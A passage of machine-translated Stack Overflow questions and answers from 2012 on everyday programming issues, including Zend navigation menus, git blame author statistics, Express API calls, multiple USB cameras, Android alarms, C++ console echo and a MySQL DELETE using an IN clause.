          <module>default</module>
        </why>
        <who>
          <label>who</label>
          <controller>page</controller>
          <action>who</action>
        </who>
        <resources>
          <label>resources</label>
          <controller>page</controller>
          <action>resources</action>
        </resources>
        <signin>
          <label>sign in</label>
          <controller>account</controller>
          <action>login</action>
          <module>default</module>
        </signin>
      </pages>
    </home>
  </nav> 
```

...

**应用程序/Bootstrap.php：**

```
<?php function _initViewHelpers() {
   $this->bootstrap('layout);
   // ... Skipping to relevant part
    $navContainerConfig = new Zend_Config_Xml(APPLICATION_PATH . '/configs/navigation.xml', 'nav');
    $navContainer = new Zend_Navigation($navContainerConfig);
    $view->navigation($navContainer);
} ?> 
```

**布局/default.phtml**

```
<div class="navigation"><?php print $this->navigation(); ?></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T11:22:39.743

```
<?xml version="1.0" encoding="UTF-8" ?>
<configdata>
  <nav>
     <why>
      <label>why</label>
      <controller>page</controller>
      <action>why</action>
      <module>default</module>
    </why>
    <who>
      <label>who</label>
      <controller>page</controller>
      <action>who</action>
    </who>
    <resources>
      <label>resources</label>
      <controller>page</controller>
      <action>resources</action>
    </resources>
    <signin>
      <label>sign in</label>
      <controller>account</controller>
      <action>login</action>
      <module>default</module>
    </signin>
 </nav> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T06:31:00.083

您应该能够调整您的容器以仅显示您想要显示的链接。在这种情况下，您只需`Home`从 xml 文件中删除元素。

```
<?xml version="1.0" encoding="UTF-8" ?>
<configdata>
  <nav>
      <pages>
        <why>
          <label>why</label>
          <controller>page</controller>
          <action>why</action>
          <module>default</module>
        </why>
        <who>
          <label>who</label>
          <controller>page</controller>
          <action>who</action>
        </who>
        <resources>
          <label>resources</label>
          <controller>page</controller>
          <action>resources</action>
        </resources>
        <signin>
          <label>sign in</label>
          <controller>account</controller>
          <action>login</action>
          <module>default</module>
        </signin>
      </pages>
  </nav> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T04:13:21.120

`setMaxDepth()`和怎么样`setMinDepth()`？您可以设置您希望菜单呈现的深度：

```
<?= $this->navigation()->menu()
                       ->setMinDepth(1)
                       ->setMaxDepth(2)
                       ->render() . PHP_EOL; ?> 
```

[此外，您可以在官方手册](http://framework.zend.com/manual/en/zend.view.helpers.html#zend.view.helpers.initial.navigation.menu)中找到有关导航视图助手的更多信息。这些信息通常比您在教程中找到的信息更相关。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T10:19:50.303

当您从 XML 文件中删除主菜单时，您会遇到异常

> Zend_Navigation_Exception: Invalid argument: Unable to determine class to instance in C:\www\project\library\Zend\Navigation\Page.php on line 235

# git - 按作者确定当前代码分布

> ID：10239834
> 
> 赞同：10
> 
> 时间：2012-04-20T03:28:23.423
> 
> 标签：git

我认为如果可以获取一个 Git 存储库，运行一些脚本，并让它生成代码库中的行数，以及每个作者对其做出贡献的比例，那将是一个很好的选择。

基本上，因为我是一个有竞争力的程序员，我想要一个个人指标来查看我写的行数（在当前的 HEAD 中）是否大于我的合作伙伴。说“我编写了当前代码库的 %”将是一个有趣的统计数据。

有没有人想过这样做？我一直在寻找一种方法，但我的 shell 脚本不是最好的，所以我无法单独完成。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T06:10:29.397

您可以使用 git log，如“[哪些 Git 提交统计数据易于拉取](https://stackoverflow.com/a/1487421/6309)”中所示。

或者您可以查看 Git [Lookatgit](https://github.com/mpdehaan/lookatgit)项目，该项目确实检查了更改的行数，如其[`gitauthor.rb`class](https://github.com/mpdehaan/lookatgit/blob/master/gitauthor.rb)所示。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T11:35:25.390

您可能需要[gitdm](https://www.gitorious.org/mining-tools/gitdm)，它可以完全满足您的需求。我们将它用于 Mahara 项目以产生[贡献统计](https://mahara.org/interaction/forum/topic.php?id=4469)。

只需按照 README 的建议进行操作：

> 用于生成“谁编写 2.6.x”LWN 文章的典型命令行如下所示：
> 
> ```
> git log -p -M v2.6.19..v2.6.20 |  gitdm -u -s -a -o results -h results.html 
> ```

您也可以根据自己的目的对其进行自定义。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T07:05:57.840

您可以尝试解析[`git-blame`](http://linux.die.net/man/1/git-blame). 这个命令给出了最后一个编辑文件每一行的人。

这个例子不完全是你想要的，但我认为它给了你这个想法：

```
git blame -e the/file | awk -F '<|>' '{print $2}' | sort | uniq -c 
```

这将打印作者的电子邮件地址以及他们最后为文件修改的行数，例如：

```
 47 foo@bar.com
  34712 blah@baz.com 
```

要使其在整个存储库上运行，您可以执行以下操作：

```
git ls-files | while read f; do git blame -e $f; done | awk -F '<|>' '{print $2}' | sort | uniq -c 
```

这里的想法是首先使用 git ls-files 生成文件列表，然后在每个文件上运行上述代码段（使用[此处](https://stackoverflow.com/a/6566602/1298153)提到的代码段）。如果您在大型代码库上运行它，您可能希望将中间结果存储在临时文件中，而不是使用管道。

# c# - RowDataBound、buttonfield 和 boundfield

> ID：10239838
> 
> 赞同：0
> 
> 时间：2012-04-20T03:29:02.160
> 
> 标签：c#, asp.net, rowdatabound

我想使用 RowDataBound 以确保每行中的下载按钮（按钮字段）将根据文件名（键字段）下载正确的文件，但我不知道如何制作它，因为我还是 asp.net 的新手和 C#。谁能给我一些想法怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:42:59.720

只需将网格中按钮的命令参数属性与键字段绑定即可。然后在 RowDataBound 事件上找到按钮并将下载的链接分配给它。

或者如果你想执行一些按钮点击然后在网格的 RowCommand 事件中找到你的按钮。将命令名称分配给按钮。

访问此链接，它将对您有所帮助。 [这里](http://www.codeproject.com/Articles/36528/GridView-all-in-one)

# node.js - ExpressJS - 联系外部 API

> ID：10239840
> 
> 赞同：1
> 
> 时间：2012-04-20T03:29:36.837
> 
> 标签：node.js, express

事情是这样的：我有一个将数据发送到服务器的客户端。该服务器必须联系外部 API 并将其响应发送回客户端。一旦服务器获得客户端数据，我就是不知道如何以及在何处联系外部 API。

我像这样路由客户端数据：

```
app.post('/getAutoComplete', routes.read); 
```

routes.read 检索 req.body 中的数据。使用我的 nodejs 版本（没有 express 框架），然后我以这种方式请求 api：

```
var http = require('http'), options = {
        host : "192.168.1.38",
        port : 8080,
        path : "/myURL",
        method : 'POST'
};

var webservice_data = "";

var webservice_request = http.request(options, function(webservice_response)
{
    webservice_response.on('error', function(e){ console.log(e.message); });
    webservice_response.on('data', function(chunk){ webservice_data += chunk;});
    webservice_response.on('end', function(){res.send(webservice_data);});
});

webservice_request.write(req.body);
webservice_request.end(); 
```

问题是我想使用原生 expressJS 方法，如 app.post 但我不知道如何，因为：

1.  Express (app) 对象在此处不​​可用（在 app.js 中声明但不在路由文件中）
2.  我不知道如何使用 app.post 发送 POST 数据

有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T07:36:40.217

```
app.post('/getAutoComplete', routes.read);
// assuming routes.read lookes something like this
routes.read = function read(req, res) {
  var http = require('http'), options = {
          host : "192.168.1.38",
          port : 8080,
          path : "/myURL",
          method : 'POST'
  };

  var webservice_data = "";

  var webservice_request = http.request(options, function(webservice_response)
  {
      webservice_response.on('error', function(e){ console.log(e.message); });
      webservice_response.on('data', function(chunk){ webservice_data += chunk;});
      webservice_response.on('end', function(){res.send(webservice_data);});
  });

  webservice_request.write(req.body);
  webservice_request.end();
}; 
```

另请查看[https://github.com/mikeal/request](https://github.com/mikeal/request) 它是在节点中执行 Web 请求的事实上的模块。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T04:15:08.313

`routes.read`是一个函数。您可以使用额外的参数调用它，例如

```
app.post('/getAutoComplete', function(req,res) {
    var q = req.query.q;  // or whatever data you need
    routes.read(q, function(err, response) {
        if (err) throw err;
        return res.json(response);
    });
}); 
```

现在让`routes.read`函数使用第一个参数作为查询，当它从远程 API 收集响应时，调用第二个参数，将任何错误作为第一个参数，将响应作为第二个参数。

**更新**这个答案已经被选为答案，但如果我也展示了一个 routes.read 的例子，它会更有帮助：

```
routes.read = function(q, cb) {
    // pretend we calculate the result
    var result = q * 10;
    if (result > 100) {
        // call the callback with error set
        return cb("q value too high");
    }
    // all is well, use setTimeout to demonstrate
    // an asynchronous return
    setTimeout(function() { cb(null, result) }, 2000);
}; 
```

# c# - 一台PC可以访问多少个USB摄像头

> ID：10239843
> 
> 赞同：5
> 
> 时间：2012-04-20T03:29:44.933
> 
> 标签：c#, .net, camera, usb

我只是想知道一台台式电脑可以访问多少个 USB 摄像头？有没有限制？我计划创建自己的 Windows 应用程序（使用 .NET）来捕捉大约 10 个连接到我的台式电脑的 USB 摄像头。这可能吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-20T09:39:34.640

问题不在于你能发现多少。在单个 USB 总线上，~127 是可能的。

但是，USB 总线每秒只能传输有限数量的字节。因此，如果您想使用多于一个，则必须计算视频流的带​​宽量。

示例：USB 总线通常可以实际传输约 35 MB/s。每像素 640*480*2 字节 => 每帧 614400 字节。@30 FPS 这大约是 17 MB/s，因此您可以在此设置下同时使用 2 个摄像头。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-06-25T10:26:19.953

如果那实际上，请参阅将 5 个摄像头连接到一台计算机的代码（处理器核心 i3，8gb 内存！！！）您只需将所有摄像头连接到您计算机上的 USB 端口！！！ [git 集线器链接](https://github.com/fen1979/testcams.git)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-09-21T08:14:44.170

有点晚了抱歉 :) 我发现单个 USB 卡受 USB 带宽的限制。但是..如果您在 PCI 上添加 USB 卡，您可以获得更多相机，但是...大多数供应商不会费心更改计算机看到的 USB 卡地址，因此您需要从不同供应商处购买 USB 到 PCI 卡并试试运气. 我对火线有同样的问题。这是我的python代码。（感谢stackoverflow上的其他程序员）

```
# show multiple usb cameras

import os
import cv2
import threading
import time
import datetime

#font for image writing
font = cv2.FONT_HERSHEY_SIMPLEX
fontScale = 1
fontColor = (255,180,180)
lineType = 2

SaveImage = True # if true save images
duration = [100,100,100,10,10] # time between image saves in sec
IMAGESAVEPATH = "C:/tmp/pix" # path for camera to store image to

ShowText = True #Show text on image - text will be  saved with the image

#camera thread. here me make a thread and its functions
class camThread(threading.Thread):
def __init__(self, previewName, camID):
    threading.Thread.__init__(self)
    self.previewName = previewName
    self.camID = camID
def run(self):
    print ("Starting " + self.previewName)
    camPreview(self.previewName, self.camID)

#camera main loop - here we init the specific camera and start it then have a             window to show the image and we store the image to the right directory
def camPreview(previewName, camID):
    cv2.namedWindow(previewName)
cam = cv2.VideoCapture(camID) #start the camera (the cameras are numbered by the         order they are connected to the computer)
if cam.isOpened():  # try to get the first frame
    cam.set(3,4000)    #this will bring the largest frame set    
    cam.set(4,4000)
    cam.set(5,1) #fps
    time.sleep(2)
    cam.set(15, -1.0)
    rval, frame = cam.read() #read the image
else:
    rval = False

TStart = time.time() # time  for next image
mpath = os.path.join(IMAGESAVEPATH, str(camID)) #make sure the directory we save in exists, otherwise make it
print("try to make dir ", mpath, " T " , time.time())
if not os.path.exists(mpath):
    os.makedirs(mpath)

    cv2.namedWindow(previewName, cv2.WINDOW_NORMAL)

while rval: #if we get an image
    height, width, channels = frame.shape
    if ShowText: # write text on the image
        caption = str(camID) + " - " + str(height) + " " + str(width) + " "
        cv2.putText(frame,str(caption),(20,20),font, fontScale, fontColor, lineType)
    cv2.imshow(previewName, frame) # show image in its window
    #cv2.resizeWindow(previewName, 1280,960) # resize all windows removed ofer
    rval, frame = cam.read() #raed next image
    key = cv2.waitKey(20) 
    if key == 27:  # exit on ESC
        print("key pressed ", camID)
        break

    TDiff = int(time.time() - TStart) # time difference from last image
    if (SaveImage and TDiff > duration[camID]): # Save if time passed
        file_name = os.path.join(mpath, "T{:%Y.%m.%d %H-%M-%S}.jpg".format(datetime.datetime.now())) # make file name string
        cv2.imwrite(file_name, frame) 
        print("\rsaved to : ", file_name)
        TStart = time.time() #reset time to next image

    cv2.destroyWindow(previewName)

# Create 5 threads as follows
thread1 = camThread("Camera 1", 0)
thread2 = camThread("Camera 2", 1)
thread3 = camThread("Camera 3", 2)
thread4 = camThread("Camera 4", 3)
thread5 = camThread("Camera 5", 4)
thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T08:34:36.787

连接到一台主机的 USB 设备的最大限制 - 127。因此，您最多可以连接 100 多个设备并且它们可以正常工作（100 多个 - 因为集线器也是活动设备并且有自己的地址）。

可能，您尝试访问第一个（已经活动的）相机并且程序失败，因为相机已经锁定？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T08:17:01.313

[已编辑]

实际上，请参阅这篇文章，其中解释了： [获取已连接 USB 设备的列表](https://stackoverflow.com/questions/3331043/get-list-of-connected-usb-devices)

我不确定是否有最大值。如果我发现，我会检查并回复。

[进一步编辑]

找不到记录的最大值。从理论上讲，它`ManagementObjectCollection`应该能够容纳数百万个物体。如果您遇到问题（我怀疑 10 台设备），您可以在实例化时预先分配集合大小。

我刚刚进行了一次测试，我可以通过集线器接收 10 多个 USB 设备。你应该没事。

# java - Android - 在 5 个活动之间切换并保留第一个活动的状态

> ID：10239852
> 
> 赞同：0
> 
> 时间：2012-04-20T03:31:23.903
> 
> 标签：java, android, eclipse, arcgis

我有 5 种不同的活动。

第一个活动是我的应用程序的第一页。它顶部有一个导航栏，可让我在所有 5 个活动之间移动。（导航栏出现在所有活动的 xml 布局中）

我面临的问题是，每当我在返回（Activity 2 到 Activity 1）之前移动到另一个活动（例如 Activity 1 到 Activity 2）时，我的 Activity 1 不会在其中呈现 MapView。当应用程序没有切换活动时，MapView 工作正常。

我目前正在使用此代码在活动之间移动：

活动 1 中的代码

```
startActivity(new Intent(Activity1.this, Activity2.class)); 
```

活动 2 中的代码

```
startActivity(new Intent(Activity2.this, Activity1.class)); 
```

目前，我设法回到活动 1 的唯一方法是按下手机的后退按钮。但我将面临另一个问题。

如果我在超过 2 个活动之间移动（例如，活动 1 到活动 2 和活动 3），后退按钮将使其从活动 3 转到活动 2，最后转到活动 1。（我在 stackoverflow 上找到了一些示例来克服这个问题）

MapView 的主要问题是不是因为我没有正确配置而导致的？

还是我在活动之间切换的方式造成的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T04:29:39.570

对于您的第一个问题，我建议您调查方法和参数以`Intent.setFlags(Intent.FLAG_ACTIVITY_???)`

例如，在您的示例中，您可以执行以下操作：

活动 1 中的代码

```
// No change here
startActivity(new Intent(Activity1.this, Activity2.class)); 
```

活动 2 中的代码

```
Intent i = new Intent(Activity2.this, Activity1.class);
i.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
startActivity(i); 
```

这将阻止大量活动的建立，并且需要大量的后退按钮才能退出应用程序。对于您的 5 个活动，您的主 Activity1 应该使用默认值来启动 Activity2、3、4 和 5，并且所有其他活动应该使用`FLAG_ACTIVITY_REORDER_TO_FRONT`在它们自己之间切换并返回到 Activity1。

对于您的第二个问题，我们需要更多信息 - 我可以建议您从此处实际删除问题并将其作为单独的查询重新发布，以及相关代码和 LogCat 输出。它很可能与开始活动没有直接关系。

# c++ - cout<<"\n\n 任意键继续或 Ctrl+Z 退出。"; 如何隐藏按下的键？

> ID：10239855
> 
> 赞同：2
> 
> 时间：2012-04-20T03:31:39.803
> 
> 标签：c++

在我的循环结束时，我有：

```
cout<<"\n\n  any key to continue or Ctrl+Z to exit."; 
```

它允许用户继续输入数据，或按 退出`Ctrl``Z`。当用户决定继续输入数据时，我想隐藏按下的键。

当用户按下任何键以保持循环时，我不希望出现按下的键。我怎样才能做到这一点？我正在使用 Dev-C++。我的函数代码如下。

```
void student::read()
{
    char response;  ofstream OS ("student.dat", ios::app);

    do
    {
        cout<<"Name: ";
        cin>>name;
        cout<<"Age: ";
        cin>>age;
        cout<<"GPA: ";
        cin>>GPA;

        //calling writefile to write into the file student.dat
        student::writefile();
        cout<<"\n\n  any key to continue or Ctrl+Z to exit."<<endl<<endl;

        cin>>response;
        cin.ignore();

    }
    while(cin);  //Ctrl+Z to exit
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T03:46:15.143

有多种方法可以处理这个

但这取决于您使用的操作系统

[http://opengroup.org/onlinepubs/007908799/xcurses/curses.h.html](http://opengroup.org/onlinepubs/007908799/xcurses/curses.h.html) http://en.wikipedia.org/wiki/Conio.h

选项 1：使用 conio.h 的 Windows

```
 getch() 
```

或者对于 *nix 使用 curses.h

```
getch() 
```

选项 2：在 Windows 中，您可以使用 SetConsoleMode() 关闭任何标准输入函数的回显。代码：

```
#include <iostream>
#include <string>
#include <windows.h>

using namespace std;

int main()
{
  HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE); 
  DWORD mode = 0;
  GetConsoleMode(hStdin, &mode);
  SetConsoleMode(hStdin, mode & (~ENABLE_ECHO_INPUT));

  string s;
  getline(cin, s);

  cout << s << endl;
  return 0;
 }//main 
```

或 *nix 风格

```
#include <iostream>
#include <string>
#include <termios.h>
#include <unistd.h>

using namespace std;

int main()
{
   termios oldt;
   tcgetattr(STDIN_FILENO, &oldt);
   termios newt = oldt;
   newt.c_lflag &= ~ECHO;
   tcsetattr(STDIN_FILENO, TCSANOW, &newt);

   string s;
   getline(cin, s);

   cout << s << endl;
   return 0;
 }//main 
```

# mysql - 如何检查具有列“nid”的表是否有多个值，如果存在则删除它们

> ID：10239856
> 
> 赞同：0
> 
> 时间：2012-04-20T03:31:40.453
> 
> 标签：mysql

我想`nid`在 Mysql 中的表中检查一个带有标题的列`node`

我有一个值列表，例如**17、21、45、48**

我可以使用以下代码获取以下代码以找到`nid`等于**17的行**

```
DELETE FROM node WHERE nid = 17 
```

我应该如何编辑它以检查所有值 = **17,21,45,48**。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T03:37:24.273

使用`IN`子句：

```
DELETE FROM node WHERE nid IN (17, 21, 45, 48) 
```

# php - PHP SOAP 的特点

> ID：10239858
> 
> 赞同：0
> 
> 时间：2012-04-20T03:31:44.697
> 
> 标签：php, soap, soap-client

我想知道 PHP Soap 中完全支持的功能，我已经尝试对此进行研究，但是支持 PHP Soap 的文档很少。

此外，在通过客户端机器到 Web 服务然后服务器交换数据期间如何使用 Soap。

我知道这是相当模糊的，但是当我自己经常被问到这个问题时，我认为最好找到更多关于它的信息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T04:17:20.813

PHP 为客户端和服务器提供了一些内置的 SOAP 类。文档在[这里](http://docs.php.net/manual/en/book.soap.php)。

但是您必须确保您的 PHP 构建是使用 SOAP 支持编译的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T06:02:58.050

“PHP 中完全支持的功能”几乎不存在。

内置 SOAP 客户端仅适用于基本服务。它不支持任何 WS 扩展，因此您必须手动添加支持，例如包括 WS-Security 的标头。

此外，命名空间处理和创建请求也存在一些问题。

如果您将使用它并且遇到缺少参数或格式错误的请求的问题，您可能想要修改请求 - 这可以通过扩展 SoapClient 类和覆盖 doRequest 函数来完成。

# wpf - WPF 绑定表达式和依赖属性

> ID：10239862
> 
> 赞同：3
> 
> 时间：2012-04-20T03:32:30.677
> 
> 标签：wpf, data-binding

我正在尝试将文本框绑定到依赖属性以更改其宽度。以下代码不起作用。有什么帮助吗？

```
 public class ToolbarManager : DependencyObject
    {
        public static readonly DependencyProperty toolbarButtonWidth = DependencyProperty.Register("toolbarButtonWidth", typeof(Double), typeof(ToolbarManager), new FrameworkPropertyMetadata(32.0, FrameworkPropertyMetadataOptions.AffectsMeasure ));
        public static readonly DependencyProperty toolbarButtonHeight = DependencyProperty.Register("toolbarButtonHeight", typeof(Double), typeof(ToolbarManager), new FrameworkPropertyMetadata(32.0, FrameworkPropertyMetadataOptions.AffectsMeasure));

        public double ButtonWidth
        {
            get { return (double)GetValue(toolbarButtonWidth); }
            set { SetValue(toolbarButtonWidth, value); }
        }

        public double ButtonHeight
        {
            get { return (double)GetValue(toolbarButtonHeight); }
            set { SetValue(toolbarButtonHeight, value); }
        }

        public static ToolbarManager Instance { get; private set; }

        static ToolbarManager()
        {
            Instance = new ToolbarManager();

        }
    } 
```

这是标记代码：

```
<TextBox Width="{Binding Source={x:Static local:ToolbarManager.Instance}, Path=ButtonWidth, Mode=OneWay}" /> 
```

默认值有效，但如果我修改代码中的值没有任何反应？！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T07:51:02.997

重命名您的依赖属性应该可以解决您的问题

```
public class ToolbarManager : DependencyObject
{
    public static readonly DependencyProperty ButtonWidthProperty =
      DependencyProperty.Register("ButtonWidth", typeof(Double), typeof(ToolbarManager), new FrameworkPropertyMetadata(32.0, FrameworkPropertyMetadataOptions.AffectsMeasure ));
    public static readonly DependencyProperty ButtonHeightProperty =
      DependencyProperty.Register("ButtonHeight", typeof(Double), typeof(ToolbarManager), new FrameworkPropertyMetadata(32.0, FrameworkPropertyMetadataOptions.AffectsMeasure));

    public double ButtonWidth
    {
        get { return (double)GetValue(ButtonWidthProperty); }
        set { SetValue(ButtonWidthProperty, value); }
    }

    public double ButtonHeight
    {
        get { return (double)GetValue(ButtonHeightProperty); }
        set { SetValue(ButtonHeightProperty, value); }
    }

    public static ToolbarManager Instance { get; private set; }

    static ToolbarManager()
    {
        Instance = new ToolbarManager();
    }
} 
```

希望这可以帮助

# android - 使用 Android 服务的 Android 中的多个警报

> ID：10239864
> 
> 赞同：0
> 
> 时间：2012-04-20T03:32:41.673
> 
> 标签：android

这是我在其中放置警报的保存按钮。但问题是，如果我添加 1 个警报，它会很好用，但是如果我在最后一个警报触发之前的下一分钟添加一个警报，它会取消最后一个警报并更新到新警报，我尝试更改请求代码，但它对我不起作用

```
 save = (Button)findViewById(R.id.save_rem);
        save.setOnClickListener(new OnClickListener() 
        {

            public void onClick(View arg0) 
            {
                title_txt = title.getText().toString();
                description_txt = description.getText().toString();
                id++;

                addRemInDb a = new addRemInDb();
                int v = a.insert(title_txt, hour, minute, mMonth, mDay, mYear, description_txt);
                //a.deleteTable();
                a.closeDB();
                if(v == -1)
                {
                    Toast.makeText(getApplication(), "Title & Time Must Not Be Same",Toast.LENGTH_LONG).show();
                }
                else
                {                                               
                    Calendar cal = Calendar.getInstance();

                    //Setting alarm to be triggered on specified date and time
                    cal.set(mYear, mMonth, mDay, hour, minute, seconds);

                    requestcode++; // Here request code is adding every time when i click in save button

                    Intent alarmIntent = new Intent(getApplicationContext(), AlarmReceiver.class);

                    alarmIntent.putExtra("title", title_txt);           //This is title for notification
                    alarmIntent.putExtra("note", description_txt);      //This is Description for notification
                    alarmIntent.putExtra("rq", requestcode);

                    PendingIntent sender = PendingIntent.getService(getApplicationContext(), requestcode, alarmIntent,PendingIntent.FLAG_UPDATE_CURRENT | Intent.FILL_IN_DATA);

                    AlarmManager alarmManager = (AlarmManager)getSystemService(ALARM_SERVICE);
                    alarmManager.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);                       

                    finish();

                }       

            }
        }); 
```

这是我的 AlarmReciever 类

```
public class AlarmReceiver extends Service
{
@Override
public void onCreate() 
{

}

@Override
public void onStart(Intent intent, int startId) 
{
    super.onStart(intent, startId);     

    Bundle extras = intent.getExtras();

    String title=extras.getString("title");
    String note=extras.getString("note");
    int requestcode = extras.getInt("rq");

    NotificationManager nManger = (NotificationManager)getSystemService(NOTIFICATION_SERVICE);

    Notification notification = new Notification(R.drawable.notify, "Reminder", System.currentTimeMillis());

    PendingIntent contentIntent = PendingIntent.getService(getApplicationContext(), requestcode, new Intent(getApplicationContext(), AlarmReceiver.class), 0);

    notification.setLatestEventInfo(getApplicationContext(), note, title, contentIntent);
    notification.flags = Notification.FLAG_INSISTENT;
    notification.defaults = Notification.DEFAULT_SOUND;

    nManger.notify(NOTIFICATION_ID, notification);

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T15:42:45.383

尝试摆脱`FLAG_UPDATE_CURRENT`你的`PendingIntent`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T18:55:22.390

生成的请求代码不起作用，因为我添加了这一行并使用 intent_id 作为我的请求代码，它运行得非常好

final int intent_id= (int) System.currentTimeMillis();

# android - 单选组/按钮查询

> ID：10239867
> 
> 赞同：1
> 
> 时间：2012-04-20T03:32:59.100
> 
> 标签：android, radio-button

当我使用视图翻转器显示不同的 xml 并且每个 xml 都包含单选按钮时，我遇到了问题。所以实际上我在两种情况下我只需要任何一种方式来工作。情况一：

我需要一个 2 x 2 单选按钮，这意味着在 2 x 2 的位置总共有 4 个单选按钮，我需要选择其中的 1 个，而其他 3 个保持未选中状态。我的问题是如何在 xml 中创建我的单选按钮都在同一个组中，尽管我设法创建了一个 4 单选按钮，它们都不会是同一个组的类别。Any1 可以告诉我如何将它们分类为 1 个无线电组？

```
Codes: 
<RadioGroup
            android:id="@+id/rg1"
            android:layout_height="0dp"
            android:layout_width="fill_parent"
            android:baselineAligned="false"
            android:layout_weight="2.5"
            android:orientation="horizontal">
                <LinearLayout 
                    android:layout_width="fill_parent"
                    android:layout_height="fill_parent"
                    android:orientation="vertical"
                    android:layout_weight="1">
                    <RadioButton
                        android:id="@+id/radio0"
                        android:layout_width="wrap_content"
                        android:layout_height="fill_parent"
                        android:checked="true"
                        android:text="@string/radio1" 
                        android:textColor="#000000"
                        android:button="@drawable/radiobutton"
                        android:clickable="true"
                        android:layout_weight="1"
                        android:paddingLeft="45dp"/>
                    <RadioButton
                        android:id="@+id/radio1"
                        android:layout_width="wrap_content"
                        android:layout_height="fill_parent"
                        android:text="@string/radio2" 
                        android:textColor="#000000"
                        android:button="@drawable/radiobutton"
                        android:clickable="true"
                        android:layout_weight="1"
                        android:paddingLeft="45dp"/>
                </LinearLayout>
                <LinearLayout 
                    android:layout_width="fill_parent"
                    android:layout_height="fill_parent"
                    android:orientation="vertical"
                    android:layout_weight="1">
                    <RadioButton
                        android:id="@+id/radio2"
                        android:layout_width="wrap_content"
                        android:layout_height="fill_parent"
                        android:text="@string/radio3" 
                        android:textColor="#000000"
                        android:button="@drawable/radiobutton"
                        android:clickable="true"
                        android:layout_weight="1"
                        android:paddingLeft="45dp"/>
                    <RadioButton
                        android:id="@+id/radio3"
                        android:layout_width="wrap_content"
                        android:layout_height="fill_parent"
                        android:text="@string/radio4" 
                        android:textColor="#000000"
                        android:button="@drawable/radiobutton"
                        android:clickable="true"
                        android:layout_weight="1"
                        android:paddingLeft="45dp"/>
                </LinearLayout>
            </RadioGroup> 
```

情况2：

第二种情况是，当我翻转到另一个具有相同单选按钮和 id 的 xml 时，我尝试使用代码 nut 以某种方式清除单选按钮，但它不起作用。

PS：对不起我的英语不好

# c# - 鼠标位置如何转换为滚动控件？

> ID：10239868
> 
> 赞同：5
> 
> 时间：2012-04-20T03:32:59.397
> 
> 标签：c#, .net, winforms

我有一个垂直滚动的控件。我需要计算相对于控件顶部的鼠标位置（单击时），而不仅仅是可见区域。

例如，假设我的控件的高度为 500。滚动条导致可见矩形的高度为 100。所以当我部分滚动时，客户端坐标（通过鼠标单击）将返回一个相对于客户端矩形的数字（50 ， 例如）。

但我想知道的是从我的控制开始的偏移量，所以它应该是 250。

我已经尝试了一段时间来解决这个问题，我想我一定是忽略了一些简单的事情，因为我没有找到关于这个主题的太多信息。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T04:05:00.983

尝试查看[PointToClient 方法](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.pointtoclient.aspx)和[MousePosition 方法](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.mouseposition.aspx)，并尝试获取鼠标的 ScreenCoordinates 并将其转换为控件的相对坐标。

```
Point screenPos = new Point(MousePosition.X, MousePosition.Y);
Point myPos = myControl.PointToClient(screenPos); 
```

# c# - c#.net用什么工具来编程多轨录音软件和vst插件？

> ID：10239871
> 
> 赞同：2
> 
> 时间：2012-04-20T03:34:11.173
> 
> 标签：c#, visual-studio-2010, audio-recording, mixing, vst

我想要使​​用 Visual Studio 2010 和 C#.NET 创建一个基于软件的多轨录音室。我有两个问题：

1.  谈到良好的性能，我想知道在 Visual Studio 2010 中编写多轨软件录音室的最佳编程语言是什么？

2.  我想编写自己的 vst 插件。在 Visual Studio 2010 中用于完成此任务的最佳编程语言是什么？

我已经阅读了有关 vst.net 的信息，所以我知道并调查了它。

感谢您对我的问题的任何回答或评论！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:55:27.793

请查看[http://vstnet.codeplex.com/](http://vstnet.codeplex.com/)

> VST.NET 允许 VST 插件开发人员以任何 .NET 语言编写插件。它使 C++ 和 .NET 世界之间的过渡顺畅而轻松。建立在互操作层之上的框架提供了一个清晰和结构化的架构，大大加速了开发。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-21T13:55:26.247

我发现 .net 4 框架为 c#.net 和 vb.net的[并行编程提供了不错的支持。](http://www.microsoft.com/download/en/details.aspx?displaylang=en&id=19222)这减少了我对在项目中使用 c#.net 时数字信号处理 (DSP) 性能不佳的担忧。我认为使用[vst.net](http://vstnet.codeplex.com/)和[并行编程](http://www.microsoft.com/download/en/details.aspx?displaylang=en&id=19222)我应该能够使用 c#.net 在 vs 2010 中完成这个项目。如果应用程序中仍然存在一些性能问题，我将逐项处理这些问题，并且可能必须编写一个 c++ dll 来处理较低级别的问题。感谢大家的反馈！

# msbuild - 将 AfterBuild 目标移动到 .targets 文件

> ID：10239873
> 
> 赞同：4
> 
